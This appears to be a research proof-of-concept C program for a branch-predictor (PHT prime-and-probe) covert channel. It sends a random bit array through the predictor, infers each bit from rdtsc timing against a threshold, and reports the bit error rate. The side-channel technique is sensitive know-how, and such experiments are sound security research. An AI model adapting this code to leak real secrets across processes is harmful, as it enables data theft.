#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <assert.h>
#include <strings.h>
#include <stdio.h>
#include "pht_PP_api.h"

#define FUNC_SIZE 16

unsigned int array_size = 2;
uint8_t array[10000] = {};


uint64_t start = 0;
uint64_t end = 0;
uint64_t start_1 = 0;
uint64_t end_1 = 0;
uint64_t rdtsc_probe[10000] = {};
uint64_t THRESHOLD = 300;
unsigned cycles_low_start, cycles_high_start, cycles_low_end, cycles_high_end;

typedef void (*fptr1)(int);
void *attacker_thread(int access_index,int probe_size) {
    phtpp_t pht =  pht_prepare(probe_size);
    pht_prime(pht);

    for(int i = 0;i<pht->size; i++){
        void *p = &pht->memory[i*FUNC_SIZE];
        (*((fptr1)p))((uint8_t)array[access_index+i]);
    }
    pht_probe(pht,&rdtsc_probe[access_index]);
    return 0;
}

void generateArray(int size){
    srand(time(NULL));
    for (int i = 0; i < size; i++) {
        array[i] = rand() % 2;  // Generate a random value either 0 or 1
    }
}

int main() {
  int i = 0;
  int val = 0, biterror = 0;
  const int secret_size = 10000;

  /* 
   * Threshold latency between correct prediction and mis-prediction
   * This is used in the inference stage of the attacker
   */

  int ret_a, ret_v;
  generateArray(secret_size);
  printf("Transmitting secret...\n");
  for (i = 0; i < secret_size; i+=100) {
    attacker_thread(i,100);
  }

  for (i = 0; i < secret_size; i++) {
    val = 0;
    if (rdtsc_probe[i] < THRESHOLD) val = 1;
    printf("Secret value, array[%d]: %d; Inferred: %d; Latency: %ld",i,array[i],val,rdtsc_probe[i]);
    if (array[i] != val) {
      biterror++;
      printf("error\n");
    } else printf("\n");
  }

  printf("Total bit sent: %d, Total Error: %d, Theshold: %lu\n", secret_size,biterror, THRESHOLD);

  return 0;
}

